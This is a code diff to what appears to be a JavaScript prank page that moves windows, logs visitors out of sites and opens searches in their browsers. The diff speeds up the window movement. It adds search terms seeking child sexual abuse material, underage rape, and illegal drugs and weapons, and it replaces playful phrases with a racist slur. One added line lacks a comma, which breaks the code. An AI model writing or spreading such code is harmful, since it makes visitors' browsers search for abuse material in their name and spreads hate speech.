@@ -17,7 +17,7 @@ const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
 const WIN_WIDTH = 480
 const WIN_HEIGHT = 260
-const VELOCITY = 15
+const VELOCITY = 60
 const MARGIN = 10
 const TICK_LENGTH = 50
 
@@ -51,6 +51,9 @@ const ART = [
 
 const SEARCHES = [
   'child porn -13',
+  'father daughter rape underage',
+  'torrent safe vpn cp',
+  'SKOPJE DRUGS WEAPON BUY LOCAL TELEGRAM SITE LINK URL'
   'dildo pride bad monster',
   'gay dating apps',
   'buy estrogen pill online',
@@ -76,14 +79,7 @@ const FILE_DOWNLOADS = [
 ]
 
 const PHRASES = [
-  'The wheels on the bus go round and round, round and round, round and round. The wheels on the bus go round and round, all through the town!',
-  'Dibidi ba didi dou dou, Di ba didi dou, Didi didldildidldidl houdihoudi dey dou',
-  'I like fuzzy kittycats, warm eyes, and pretending household appliances have feelings',
-  'I\'ve never seen the inside of my own mouth because it scares me to death.',
-  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
-  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
-  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
-  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
+  'I RAPE NIGGERS',
 ]
 
 const LOGOUT_SITES = {
